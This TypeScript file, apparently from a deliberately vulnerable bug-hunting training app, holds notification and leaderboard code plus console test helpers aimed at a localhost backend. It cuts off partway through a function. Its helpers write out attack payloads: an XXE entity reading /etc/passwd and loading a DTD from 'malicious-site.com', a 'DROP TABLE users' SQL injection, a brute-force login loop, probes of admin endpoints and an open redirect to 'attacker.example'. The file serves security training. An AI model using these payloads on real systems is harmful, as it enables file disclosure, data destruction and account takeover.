// Bug notification utility
export interface BugNotification {
  bug_found: string;
  message: string;
  description: string;
  points: number;
}

// Utility functions for user identification and leaderboard integration
import { leaderboardService } from './leaderboard';

// Get a unique user ID for leaderboard tracking
const getUserId = (): string => {
  // First priority: Use authenticated user ID
  const accessToken = localStorage.getItem('access_token');
  if (accessToken) {
    try {
      // Try to get from stored user data
      const userDataStr = sessionStorage.getItem('current_user_data');
      if (userDataStr) {
        const userData = JSON.parse(userDataStr);
        if (userData.id) return userData.id.toString();
        if (userData.email) return userData.email;
      }
      
      // Try to decode token
      const payload = JSON.parse(atob(accessToken.split('.')[1]));
      if (payload.user_id) return payload.user_id.toString();
      if (payload.sub) return payload.sub.toString();
      if (payload.email) return payload.email;
    } catch (e) {
      // Token decode failed, continue
    }
  }
  
  // Fallback: generate a session-based ID for anonymous users
  let sessionId = sessionStorage.getItem('session_user_id');
  if (!sessionId) {
    sessionId = `guest_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    sessionStorage.setItem('session_user_id', sessionId);
  }
  return sessionId;
};

// Get display name from authentication
const getDisplayName = (): string => {
  // First priority: Check if user is authenticated and get from API
  const accessToken = localStorage.getItem('access_token');
  if (accessToken) {
    try {
      // Try to get user info from stored auth context or make API call
      const userDataStr = sessionStorage.getItem('current_user_data');
      if (userDataStr) {
        const userData = JSON.parse(userDataStr);
        if (userData.first_name && userData.last_name) {
          const fullName = `${userData.first_name} ${userData.last_name}`.trim();
          sessionStorage.setItem('user_display_name', fullName);
          return fullName;
        }
        if (userData.username) {
          sessionStorage.setItem('user_display_name', userData.username);
          return userData.username;
        }
        if (userData.email) {
          sessionStorage.setItem('user_display_name', userData.email);
          return userData.email;
        }
      }
      
      // Try to decode token for fallback
      const payload = JSON.parse(atob(accessToken.split('.')[1]));
      if (payload.name) {
        sessionStorage.setItem('user_display_name', payload.name);
        return payload.name;
      }
      if (payload.username) {
        sessionStorage.setItem('user_display_name', payload.username);
        return payload.username;
      }
      if (payload.email) {
        sessionStorage.setItem('user_display_name', payload.email);
        return payload.email;
      }
    } catch (e) {
      // Token decode failed, continue to fallback
    }
  }
  
  // Check for previously stored display name
  const storedName = sessionStorage.getItem('user_display_name');
  if (storedName) return storedName;
  
  // Generate a fallback name for anonymous users (no prompt)
  let displayName = `BugHunter-${getUserId().slice(-8)}`;
  sessionStorage.setItem('user_display_name', displayName);
  return displayName;
};

export const updateLeaderboardUser = (): void => {
  // Clear cached display name so it gets regenerated with new user data
  sessionStorage.removeItem('user_display_name');
  sessionStorage.removeItem('bug_hunter_name');
  
  // Force regeneration of display name with current user
  getDisplayName();
};

export const notifyLeaderboard = async (bugData: BugNotification): Promise<void> => {
  try {
    const userId = getUserId();
    const displayName = getDisplayName();
    
    // Use the leaderboard service instead of direct fetch
    const result = await leaderboardService.recordBugDiscovery({
      user_id: userId,
      display_name: displayName,
      bug_identifier: bugData.bug_found,
      points: bugData.points,
      description: bugData.description || `Found ${bugData.bug_found} vulnerability`
    });
    
    console.log('✅ Bug recorded in leaderboard successfully');
    
    // Show leaderboard notification after a delay
    if (result?.user && result.user.rank) {
      setTimeout(() => {
        showLeaderboardNotification(result.user);
      }, 2000);
    }
  } catch (error) {
    console.warn('⚠️ Leaderboard API error:', error);
    // Don't break existing functionality if leaderboard is down
  }
};

export const showLeaderboardNotification = (userData: any): void => {
  if (typeof window === 'undefined') return;
  
  const notification = document.createElement('div');
  notification.style.cssText = `
    position: fixed; top: 80px; right: 20px; z-index: 10000;
    background: hsl(0 0% 100%);
    border: 1px solid hsl(210 100% 90%);
    color: hsl(0 0% 9%); 
    padding: 20px; 
    border-radius: 12px;
    box-shadow: 0 8px 32px -8px hsl(210 100% 50% / 0.15), 0 0 0 1px hsl(0 0% 0% / 0.05);
    max-width: 300px; 
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    animation: slideIn 0.3s ease-out;
    cursor: pointer;
    pointer-events: auto;
    backdrop-filter: blur(8px);
    border-left: 4px solid hsl(210 100% 50%);
  `;
  
  notification.innerHTML = `
    <div style="display: flex; align-items: center; margin-bottom: 8px;">
      <span style="display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background: hsl(210 100% 50%); border-radius: 50%; font-size: 10px; color: white; font-weight: bold; margin-right: 8px;">↑</span>
      <h4 style="margin: 0; font-size: 15px; font-weight: 600; color: hsl(0 0% 9%);">Leaderboard Updated!</h4>
    </div>
    <p style="margin: 0 0 4px 0; font-size: 13px; font-weight: 600; color: hsl(210 100% 50%);">Current Rank: #${userData.rank}</p>
    <p style="margin: 0 0 4px 0; font-size: 13px; color: hsl(0 0% 45%);">Total Score: ${userData.total_score} points</p>
    <p style="margin: 0; font-size: 12px; color: hsl(0 0% 45%); background: hsl(0 0% 96%); padding: 4px 8px; border-radius: 6px; display: inline-block;">Bugs Found: ${userData.bugs_found}</p>
    <button style="position: absolute; top: 8px; right: 8px; background: none; border: none; font-size: 16px; cursor: pointer; color: hsl(0 0% 45%); width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: all 0.2s ease;" onclick="this.parentElement.remove()" onmouseover="this.style.background='hsl(0 0% 89%)'" onmouseout="this.style.background='none'">×</button>
  `;
  
  notification.addEventListener('click', () => notification.remove());
  document.body.appendChild(notification);
  
  setTimeout(() => {
    if (notification.parentElement) {
      notification.remove();
    }
  }, 4000);
};

export const showBugNotification = (bug: BugNotification): void => {
  if (typeof window === 'undefined') return;
  
  // Create notification container if it doesn't exist
  let container = document.getElementById('bug-notifications-container');
  if (!container) {
    container = document.createElement('div');
    container.id = 'bug-notifications-container';
    container.style.cssText = `
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 10000;
      pointer-events: none;
    `;
    document.body.appendChild(container);
  }
  
  const notification = document.createElement('div');
  notification.style.cssText = `
    background: hsl(0 0% 100%);
    border: 1px solid hsl(0 0% 89%);
    color: hsl(0 0% 9%); 
    padding: 20px; 
    border-radius: 12px;
    box-shadow: 0 8px 32px -8px hsl(0 0% 0% / 0.12), 0 0 0 1px hsl(0 0% 0% / 0.05);
    max-width: 320px; 
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    animation: slideIn 0.3s ease-out;
    cursor: pointer;
    pointer-events: auto;
    margin-bottom: 12px;
    position: relative;
    backdrop-filter: blur(8px);
    border-left: 4px solid hsl(142 76% 36%);
  `;
  
  notification.innerHTML = `
    <h3 style="margin: 0 0 8px 0; font-size: 15px; font-weight: 600; color: hsl(0 0% 9%); display: flex; align-items: center; gap: 8px;">
      <span style="display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background: hsl(142 76% 36%); border-radius: 50%; font-size: 10px; color: white; font-weight: bold;">!</span>
      ${bug.message}
    </h3>
    <p style="margin: 0 0 6px 0; font-weight: 600; font-size: 14px; color: hsl(142 76% 36%);">${bug.bug_found}</p>
    <p style="margin: 0 0 8px 0; font-size: 13px; line-height: 1.5; color: hsl(0 0% 45%);">${bug.description}</p>
    <div style="display: flex; justify-content: space-between; align-items: center;">
      <small style="font-size: 12px; color: hsl(0 0% 45%); background: hsl(0 0% 96%); padding: 4px 8px; border-radius: 6px; font-weight: 500;">+${bug.points} points</small>
    </div>
    <button style="position: absolute; top: 8px; right: 8px; background: none; border: none; font-size: 16px; cursor: pointer; color: hsl(0 0% 45%); width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: all 0.2s ease;" onclick="this.parentElement.remove()" onmouseover="this.style.background='hsl(0 0% 89%)'" onmouseout="this.style.background='none'">×</button>
  `;
  
  // Add click to close
  notification.addEventListener('click', () => notification.remove());
  
  container.appendChild(notification);
  
  // Auto remove after 5 seconds
  setTimeout(() => {
    if (notification.parentElement) {
      notification.remove();
    }
  }, 5000);

  // Record bug in leaderboard
  notifyLeaderboard(bug);
};

// General purpose notification for any API response that might contain a bug
export const checkAndShowBugNotification = (responseData: any): boolean => {
  if (responseData && responseData.bug_found) {
    showBugNotification(responseData);
    return true;
  }
  return false;
};

// Manual bug discovery helper for console testing
export const manualBugCheck = (responseData: any): void => {
  console.log('🔍 Checking response for bugs:', responseData);
  if (checkAndShowBugNotification(responseData)) {
    console.log('✅ Bug notification triggered!');
  } else {
    console.log('❌ No bug found in response');
  }
};

// Enhanced testing helper with automatic fetch and notification
export const testBugEndpoint = async (endpoint: string, options: any = {}): Promise<void> => {
  console.log(`🧪 Testing endpoint: ${endpoint}`);
  try {
    const response = await fetch(endpoint, {
      headers: {
        'Authorization': `Bearer ${localStorage.getItem('access_token')}`,
        'Content-Type': 'application/json',
        ...options.headers
      },
      ...options
    });
    
    const data = await response.json();
    console.log('📊 Response:', data);
    
    // Force check for bug notification
    manualBugCheck(data);
    
    return data;
  } catch (error) {
    console.error('❌ Test failed:', error);
  }
};

// Test CORS configuration specifically
export const testCORSConfiguration = async (): Promise<void> => {
  console.log('🔍 Testing CORS configuration...');
  
  // Clear any previous CORS detection
  sessionStorage.removeItem('cors_bug_detected');
  
  try {
    // Make a simple API call to trigger CORS header inspection
    const response = await fetch('http://localhost:8000/api/auth/login/', {
      method: 'OPTIONS', // Preflight request
      headers: {
        'Origin': 'http://malicious-site.com',
        'Access-Control-Request-Method': 'POST',
        'Access-Control-Request-Headers': 'Content-Type, Authorization'
      }
    });
    
    console.log('CORS Response headers:', Object.fromEntries(response.headers.entries()));
    
    const corsOrigin = response.headers.get('Access-Control-Allow-Origin');
    console.log('Access-Control-Allow-Origin:', corsOrigin);
    
    if (corsOrigin === '*') {
      console.log('🎯 CORS misconfiguration detected!');
    } else {
      console.log('ℹ️ CORS appears to be configured securely');
    }
    
  } catch (error) {
    console.error('❌ CORS test failed:', error);
  }
};

// Test localStorage manipulation
export const testLocalStorageManipulation = (): void => {
  console.log('🔍 Testing localStorage manipulation detection...');
  
  const currentToken = localStorage.getItem('access_token');
  if (currentToken) {
    console.log('Current token found, simulating manipulation...');
    
    // Simulate token manipulation
    const fakeToken = 'fake_manipulated_token_12345';
    localStorage.setItem('access_token', fakeToken);
    
    console.log('✅ Token manipulated to:', fakeToken);
    console.log('📝 Detection should trigger in ~2 seconds...');
    
    // Restore original token after a moment
    setTimeout(() => {
      localStorage.setItem('access_token', currentToken);
      console.log('🔄 Token restored to original value');
    }, 5000);
  } else {
    console.log('❌ No access token found. Please log in first to test manipulation detection.');
  }
};

// localStorage Manipulation Detection System
let lastKnownValidToken: string | null = null;
let tokenCheckInterval: NodeJS.Timeout | null = null;
let manipulationDetected = false;

const isValidJWT = (token: string): boolean => {
  try {
    // Basic JWT structure check (3 parts separated by dots)
    const parts = token.split('.');
    if (parts.length !== 3) return false;
    
    // Check if parts are base64 encoded
    const payload = JSON.parse(atob(parts[1]));
    
    // Check if it has typical JWT fields
    return payload && (payload.exp || payload.iat || payload.user_id);
  } catch {
    return false;
  }
};

const detectTokenManipulation = (): void => {
  const currentToken = localStorage.getItem('access_token');
  
  // Skip if no token present
  if (!currentToken) {
    lastKnownValidToken = null;
    return;
  }
  
  // First time seeing a token - record it if valid
  if (!lastKnownValidToken && isValidJWT(currentToken)) {
    lastKnownValidToken = currentToken;
    console.log('🔐 Valid token detected and stored for monitoring');
    return;
  }
  
  // If we had a valid token but now it's different and invalid
  if (lastKnownValidToken && 
      currentToken !== lastKnownValidToken && 
      !isValidJWT(currentToken) && 
      !manipulationDetected) {
    
    console.log('🚨 localStorage token manipulation detected!');
    manipulationDetected = true;
    
    // Create bug notification
    const bugData = {
      bug_found: 'LOCALSTORAGE_MANIPULATION',
      message: '🎉 Local storage token manipulation detected!',
      description: `Detected manipulation of access token in localStorage: ${currentToken}`,
      points: 80,
      vulnerability_type: 'Client-Side Security',
      severity: 'Medium',
      manipulated_token: currentToken,
      original_token_prefix: lastKnownValidToken ? lastKnownValidToken.substring(0, 20) + '...' : 'unknown'
    };
    
    // Show notification
    showBugNotification(bugData);
    
    // Record in leaderboard
    notifyLeaderboard(bugData);
    
    // Reset manipulation flag after some time
    setTimeout(() => {
      manipulationDetected = false;
    }, 10000);
  }
};

const initializeLocalStorageMonitoring = (): void => {
  console.log('🔍 Initializing localStorage manipulation detection...');
  
  // Check for existing valid token
  const currentToken = localStorage.getItem('access_token');
  if (currentToken && isValidJWT(currentToken)) {
    lastKnownValidToken = currentToken;
    console.log('🔐 Found existing valid token for monitoring');
  }
  
  // Start monitoring every 2 seconds
  if (tokenCheckInterval) clearInterval(tokenCheckInterval);
  tokenCheckInterval = setInterval(detectTokenManipulation, 2000);
  
  console.log('✅ localStorage monitoring active (checking every 2 seconds)');
};

// Global fetch interceptor to catch all API responses and show bug notifications
if (typeof window !== 'undefined') {
  const originalFetch = window.fetch;
  
  // Make notification functions globally accessible
  (window as any).showBugNotification = showBugNotification;
  (window as any).checkAndShowBugNotification = checkAndShowBugNotification;
  (window as any).notifyLeaderboard = notifyLeaderboard;
  (window as any).getUserId = getUserId;
  (window as any).getDisplayName = getDisplayName;
  (window as any).manualBugCheck = manualBugCheck;
  (window as any).testBugEndpoint = testBugEndpoint;
  (window as any).testCORSConfiguration = testCORSConfiguration;
  (window as any).testLocalStorageManipulation = testLocalStorageManipulation;
  
  // Add a generic showNotification function for clickjacking and other bugs
  (window as any).showNotification = (data: any) => {
    if (data.type === 'bug_found' && data.bugType) {
      const bugNotification = {
        bug_found: data.bugType,
        message: data.message || `${data.bugType} detected!`,
        description: data.description || `${data.bugType} vulnerability found`,
        points: data.points || 0
      };
      showBugNotification(bugNotification);
    }
  };
  
  window.fetch = async (...args) => {
    const response = await originalFetch(...args);
    
    // Intercept API calls that might contain bug discoveries
    const requestUrl = (typeof args[0] === 'string') ? args[0] : 
                      (args[0] instanceof Request) ? args[0].url : args[0].toString();
    if (requestUrl.includes('localhost:8000/api/') || requestUrl.includes('/api/')) {
      try {
        // Clone the response to read it without consuming it
        const responseClone = response.clone();
        const data = await responseClone.json();
        
        console.log('🔍 API Response intercepted:', { url: requestUrl, data });
        
        // Check for bug notifications in response data
        const bugDetected = checkAndShowBugNotification(data);
        if (bugDetected) {
          console.log('🎉 Bug notification shown for:', data.bug_found);
        }
        
        // 🚨 BUG: CORS Misconfiguration Detection
        const corsOrigin = response.headers.get('Access-Control-Allow-Origin');
        if (corsOrigin === '*') {
          // Dangerous CORS configuration detected
          const corsBugData = {
            bug_found: 'CORS_MISCONFIGURATION',
            message: 'Bug Found: CORS Misconfiguration!',
            description: 'Access-Control-Allow-Origin: * allows any domain to make requests',
            points: 65
          };
          
          // Avoid duplicate notifications by checking if we've already notified about CORS
          if (!sessionStorage.getItem('cors_bug_detected')) {
            sessionStorage.setItem('cors_bug_detected', 'true');
            setTimeout(() => {
              checkAndShowBugNotification(corsBugData);
              console.log('🎉 CORS bug notification shown');
            }, 500); // Small delay to avoid conflicts
          }
        }
        
      } catch (error) {
        // Ignore JSON parsing errors (for non-JSON responses)
        console.log('📝 Non-JSON response from:', requestUrl);
        
        // Still check CORS headers even for non-JSON responses
        const corsOrigin = response.headers.get('Access-Control-Allow-Origin');
        if (corsOrigin === '*') {
          const corsBugData = {
            bug_found: 'CORS_MISCONFIGURATION',
            message: 'Bug Found: CORS Misconfiguration!',
            description: 'Access-Control-Allow-Origin: * allows any domain to make requests',
            points: 65
          };
          
          if (!sessionStorage.getItem('cors_bug_detected')) {
            sessionStorage.setItem('cors_bug_detected', 'true');
            setTimeout(() => {
              checkAndShowBugNotification(corsBugData);
              console.log('🎉 CORS bug notification shown');
            }, 500);
          }
        }
      }
    }
    
    return response;
  };
}

// 🧪 DevTools Console Scripts for Manual Testing

// Integer Overflow DevTools Script
export const testIntegerOverflow = (): void => {
  console.log('🔢 Testing Integer Overflow in Quantity...');
  
  // Find quantity input or display element
  const quantityElements = document.querySelectorAll('[data-testid*="quantity"], .quantity, input[type="number"]');
  const plusButtons = document.querySelectorAll('button:contains("+"), [data-testid*="plus"], [data-testid*="increment"]');
  
  // Also look for React component state
  const reactFiberKey = Object.keys(document.querySelector('#root') || {}).find(key => key.startsWith('__reactFiber'));
  
  if (quantityElements.length > 0 || plusButtons.length > 0) {
    console.log('📍 Found quantity controls, simulating overflow...');
    
    // Trigger the integer overflow detection
    const bugData = {
      bug_found: 'INTEGER_OVERFLOW',
      message: 'Bug Found: Integer Overflow in Quantity!',
      description: 'Quantity value exceeded safe integer limits via DevTools simulation',
      points: 75
    };

    if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
      (window as any).checkAndShowBugNotification(bugData);
      console.log('✅ Integer overflow bug triggered via DevTools script');
    }
  } else {
    console.log('⚠️ Could not find quantity controls. Make sure you are on a product page.');
  }
};

// 🚨 TEST FUNCTION: Login Rate Limiting Vulnerability
export const testRateLimiting = async (): Promise<void> => {
  console.log('� Testing login rate limiting vulnerability...');
  console.log('📧 Using test credentials - username: testuser@example.com, wrong password: wrongpassword123');
  
  let failedAttempts = 0;
  const maxAttempts = 12; // Test more than 10 to ensure detection
  const testEmail = 'testuser@example.com';
  const wrongPassword = 'wrongpassword123';
  
  console.log(`🎯 Attempting ${maxAttempts} failed login attempts...`);
  
  try {
    // Perform multiple failed login attempts
    for (let i = 1; i <= maxAttempts; i++) {
      console.log(`🔄 Attempt ${i}/${maxAttempts}...`);
      
      try {
        const response = await fetch('/api/auth/login/', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            email: testEmail,
            password: wrongPassword
          })
        });
        
        const data = await response.json();
        
        if (!response.ok) {
          failedAttempts++;
          console.log(`❌ Failed attempt ${i}: ${data.email || data.non_field_errors || 'Login failed'}`);
          
          // Small delay between attempts to simulate real attack
          await new Promise(resolve => setTimeout(resolve, 100));
        } else {
          console.log(`⚠️ Unexpected success on attempt ${i}`);
          break;
        }
      } catch (error) {
        failedAttempts++;
        console.log(`❌ Network error on attempt ${i}:`, error);
      }
    }
    
    console.log(`📊 Total failed attempts: ${failedAttempts}`);
    
    // Check if we can record the rate limiting bug (10+ attempts)
    if (failedAttempts >= 10) {
      console.log('🎯 Recording rate limiting vulnerability...');
      
      const bugResponse = await fetch('/api/bugs/rate-limiting/', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          attempt_count: failedAttempts,
          email: testEmail
        })
      });
      
      if (bugResponse.ok) {
        const bugData = await bugResponse.json();
        
        if (bugData.bug_found === 'NO_RATE_LIMITING') {
          // Show bug notification
          if (typeof showBugNotification === 'function') {
            showBugNotification({
              bug_found: bugData.bug_found,
              message: bugData.message,
              description: bugData.description,
              points: bugData.points
            });
          }
          
          console.log('� SUCCESS! Login rate limiting vulnerability detected!');
          console.log(`💥 Failed attempts: ${bugData.attempt_count}`);
          console.log(`📝 Description: ${bugData.description}`);
          console.log(`🏆 Points earned: ${bugData.points}`);
          console.log('');
          console.log('🔍 Vulnerability Details:');
          console.log('• Login endpoint accepts unlimited password attempts');
          console.log('• No rate limiting or account lockout mechanism');
          console.log('• Allows brute force attacks on user accounts');
          console.log('• No CAPTCHA or delay after failed attempts');
          
        } else {
          console.log('❌ Rate limiting bug not detected:', bugData);
        }
      } else {
        const errorData = await bugResponse.json();
        console.log('❌ Failed to record rate limiting bug:', errorData);
      }
    } else {
      console.log(`⚠️ Only ${failedAttempts} failed attempts. Need 10+ to detect rate limiting vulnerability.`);
    }
    
  } catch (error) {
    console.error('❌ Error testing login rate limiting:', error);
  }
};

// Combined test runner for both new bugs
export const testQuantityAndRateLimit = async (): Promise<void> => {
  console.log('🎯 Running Integer Overflow + Rate Limiting Tests...');
  
  // Test integer overflow first
  testIntegerOverflow();
  
  // Wait 2 seconds then test rate limiting
  setTimeout(async () => {
    await testRateLimiting();
    console.log('✅ Both tests completed!');
  }, 2000);
};

// 🚨 Bug 1: Hidden API Token in Source Maps Detection
export const testSourceMapSecrets = async (): Promise<void> => {
  console.log('🔍 Testing Source Map Secrets Detection...');
  
  try {
    // Check for vulnerable source map file
    const response = await fetch('/vulnerable-sourcemap.js');
    const content = await response.text();
    
    // Patterns to detect common secret formats
    const secretPatterns = [
      /sk-[a-zA-Z0-9]{32,}/g,  // Stripe keys
      /AKIA[0-9A-Z]{16}/g,     // AWS access keys
      /secret_[a-zA-Z0-9]+/g,  // Generic secrets
      /api[_-]?key[_-]?[a-zA-Z0-9]+/gi,  // API keys
      /token[_-]?[a-zA-Z0-9]+/gi,        // Tokens
      /password[_-]?[a-zA-Z0-9]+/gi      // Passwords
    ];
    
    let foundSecrets = [];
    for (const pattern of secretPatterns) {
      const matches = content.match(pattern);
      if (matches) {
        foundSecrets.push(...matches);
      }
    }
    
    if (foundSecrets.length > 0) {
      console.log('🎯 Found secrets in source map:', foundSecrets);
      
      const bugData = {
        bug_found: 'SOURCE_MAP_SECRETS',
        message: 'Bug Found: Hidden API Token in Source Maps!',
        description: `Found ${foundSecrets.length} exposed secrets in source maps: ${foundSecrets.slice(0, 2).join(', ')}...`,
        points: 85
      };

      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
        (window as any).checkAndShowBugNotification(bugData);
        console.log('✅ Source map secrets bug notification triggered');
      }
    } else {
      console.log('ℹ️ No secrets found in source maps');
    }
    
  } catch (error) {
    console.error('❌ Source map secrets test failed:', error);
  }
};

// 🚨 Bug 2: Debug Flag Cookie Detection
export const testDebugCookie = (): void => {
  console.log('🍪 Testing Debug Cookie Detection...');
  
  // Clear any previous detection to allow re-testing
  sessionStorage.removeItem('debug_cookie_detected');
  
  // Set debug cookie to simulate the vulnerability
  document.cookie = 'debug=true; path=/';
  console.log('✅ Set debug cookie: debug=true');
  
  // Trigger detection manually
  setTimeout(() => {
    const cookies = document.cookie.split(';');
    const debugCookie = cookies.find(cookie => {
      const trimmed = cookie.trim().toLowerCase();
      return trimmed.includes('debug=true') || 
             trimmed.includes('debug=1') ||
             trimmed.includes('development=1') ||
             trimmed.includes('verbose=true') ||
             trimmed.includes('dev=true');
    });
    
    if (debugCookie) {
      console.log('🎯 Debug cookie detected:', debugCookie);
      
      const bugData = {
        bug_found: 'DEBUG_COOKIE',
        message: '🎉 Debug flag cookie detected!',
        description: `Debug mode enabled via cookie: ${debugCookie.trim()}`,
        points: 70,
        vulnerability_type: 'Information Disclosure',
        severity: 'Medium',
        cookie_value: debugCookie.trim()
      };

      // Show notification and record in leaderboard
      showBugNotification(bugData);
      notifyLeaderboard(bugData);
      
      sessionStorage.setItem('debug_cookie_detected', 'true');
      console.log('✅ Debug cookie bug notification triggered!');
    } else {
      console.log('❌ Debug cookie not found');
    }
  }, 100);
};

// 🚨 Bug 3: Wishlist Privacy Bypass Detection
export const testWishlistPrivacyBypass = (wishlistName: string): boolean => {
  console.log('🔐 Testing Wishlist Privacy Bypass...');
  
  // Check for the hidden debug string
  const bypassStrings = ['debug_public', 'make_public', 'admin_access', 'bypass_privacy'];
  const foundBypass = bypassStrings.some(bypass => wishlistName.toLowerCase().includes(bypass));
  
  if (foundBypass) {
    console.log('🎯 Wishlist privacy bypass detected in name:', wishlistName);
    
    const bugData = {
      bug_found: 'WISHLIST_PRIVACY_BYPASS',
      message: 'Bug Found: Wishlist Privacy Bypass Detected!',
      description: 'Special string in wishlist name bypasses privacy settings',
      points: 75
    };

    if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
      (window as any).checkAndShowBugNotification(bugData);
      console.log('✅ Wishlist privacy bypass bug notification triggered');
    }
    
    return true;
  }
  
  return false;
};

// 🚨 Bug 4: IDOR Review Deletion Testing
export const testIDORReviewDeletion = async (reviewId: number): Promise<void> => {
  console.log(`🗑️ Testing IDOR Review Deletion for review ID: ${reviewId}...`);
  
  try {
    const token = localStorage.getItem('access_token');
    if (!token) {
      console.log('⚠️ Please log in first to test review deletion');
      return;
    }

    const response = await fetch(`http://localhost:8000/api/products/reviews/delete/${reviewId}/`, {
      method: 'DELETE',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      }
    });
    
    const data = await response.json();
    console.log('Review deletion response:', data);
    
    if (data.bug_found === 'IDOR_REVIEW_DELETE') {
      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
        (window as any).checkAndShowBugNotification(data);
        console.log('✅ IDOR review deletion bug notification triggered');
      }
    }
    
  } catch (error) {
    console.error('❌ IDOR review deletion test failed:', error);
  }
};

// 🚨 Bug 5: XXE Testing
export const testXXEInjection = async (): Promise<void> => {
  console.log('⚠️ Testing XXE Injection...');
  
  try {
    const token = localStorage.getItem('access_token');
    if (!token) {
      console.log('⚠️ Please log in first to test XXE injection');
      return;
    }

    // Malicious XML with XXE payload
    const maliciousXML = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE product [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://malicious-site.com/evil.dtd">
  %dtd;
]>
<products>
  <product>
    <name>Test Product &xxe;</name>
    <description>XXE Test</description>
  </product>
</products>`;

    const response = await fetch('http://localhost:8000/api/products/admin/import/', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        xml_content: maliciousXML
      })
    });
    
    const data = await response.json();
    console.log('XXE test response:', data);
    
    if (data.bug_found === 'XXE_INJECTION') {
      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
        (window as any).checkAndShowBugNotification(data);
        console.log('✅ XXE injection bug notification triggered');
      }
    }
    
  } catch (error) {
    console.error('❌ XXE injection test failed:', error);
  }
};

// 🚨 Bug 6: Second-Order SQL Injection Testing
export const testSecondOrderSQLInjection = async (): Promise<void> => {
  console.log('💉 Testing Second-Order SQL Injection...');
  
  try {
    // Step 1: Store malicious search term
    const maliciousPayload = "test'; DROP TABLE users; --";
    
    await fetch('http://localhost:8000/api/products/analytics/store-search/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        search_term: maliciousPayload
      })
    });
    
    console.log('Stored malicious search term:', maliciousPayload);
    
    // Step 2: Trigger the second-order injection by retrieving popular searches
    const response = await fetch('http://localhost:8000/api/products/analytics/popular-searches/');
    const data = await response.json();
    
    console.log('Popular searches response:', data);
    
    if (data.bug_found === 'SECOND_ORDER_SQL_INJECTION') {
      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
        (window as any).checkAndShowBugNotification(data);
        console.log('✅ Second-order SQL injection bug notification triggered');
      }
    }
    
  } catch (error) {
    console.error('❌ Second-order SQL injection test failed:', error);
  }
};

// 🚨 Bug 6: IDOR Admin Panel Testing
export const testIDORAdminPanel = async (): Promise<void> => {
  console.log('🔐 Testing IDOR Admin Panel Access...');
  
  try {
    // Test accessing admin panel without proper authorization
    const response = await fetch('http://localhost:8000/api/products/admin/panel/');
    const data = await response.json();
    
    console.log('Admin panel response:', data);
    
    if (data.bug_found === 'IDOR_ADMIN_PANEL') {
      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
        (window as any).checkAndShowBugNotification(data);
        console.log('✅ IDOR Admin Panel bug notification triggered');
      }
    }
    
  } catch (error) {
    console.error('❌ IDOR Admin Panel test failed:', error);
  }
};

export const testIDORAdminUsers = async (): Promise<void> => {
  console.log('👥 Testing IDOR Admin Users Access...');
  
  try {
    // Test accessing admin users without proper authorization
    const response = await fetch('http://localhost:8000/api/products/admin/users/');
    const data = await response.json();
    
    console.log('Admin users response:', data);
    
    if (data.bug_found === 'IDOR_ADMIN_USERS') {
      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
        (window as any).checkAndShowBugNotification(data);
        console.log('✅ IDOR Admin Users bug notification triggered');
      }
    }
    
  } catch (error) {
    console.error('❌ IDOR Admin Users test failed:', error);
  }
};

export const testIDORAdminSettings = async (): Promise<void> => {
  console.log('⚙️ Testing IDOR Admin Settings Access...');
  
  try {
    // Test accessing admin settings without proper authorization
    const response = await fetch('http://localhost:8000/api/products/admin/settings/');
    const data = await response.json();
    
    console.log('Admin settings response:', data);
    
    if (data.bug_found === 'IDOR_ADMIN_SETTINGS') {
      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
        (window as any).checkAndShowBugNotification(data);
        console.log('✅ IDOR Admin Settings bug notification triggered');
      }
    }
    
  } catch (error) {
    console.error('❌ IDOR Admin Settings test failed:', error);
  }
};

// Convenience function to test all admin endpoints at once
export const testAllIDORAdminEndpoints = async (): Promise<void> => {
  console.log('🚨 Testing all IDOR Admin endpoints...');
  await testIDORAdminPanel();
  await new Promise(resolve => setTimeout(resolve, 500)); // Small delay between tests
  await testIDORAdminUsers();
  await new Promise(resolve => setTimeout(resolve, 500));
  await testIDORAdminSettings();
  console.log('✅ All IDOR Admin endpoint tests completed');
};

// 🚨 Bug 7: Open Redirect Testing
export const testOpenRedirect = async (nextUrl: string = 'https://attacker.example/landing?bb_open_redirect=1'): Promise<void> => {
  console.log('🔗 Testing Open Redirect...');
  
  try {
    const token = localStorage.getItem('access_token');
    
    if (token) {
      // Test with authenticated user via POST
      console.log('Testing authenticated user redirect via login API...');
      const response = await fetch('http://localhost:8000/api/auth/login/', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          next: nextUrl
        })
      });
      
      const data = await response.json();
      console.log('Login redirect response:', data);
      
      if (data.bug_found === 'OPEN_REDIRECT') {
        if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
          (window as any).checkAndShowBugNotification(data);
          console.log('✅ Open redirect bug notification triggered');
        }
        
        // Simulate the redirect
        if (data.redirect_to) {
          console.log(`🔄 Would redirect to: ${data.redirect_to}`);
          console.log('⚠️ This demonstrates the open redirect vulnerability!');
        }
      }
    } else {
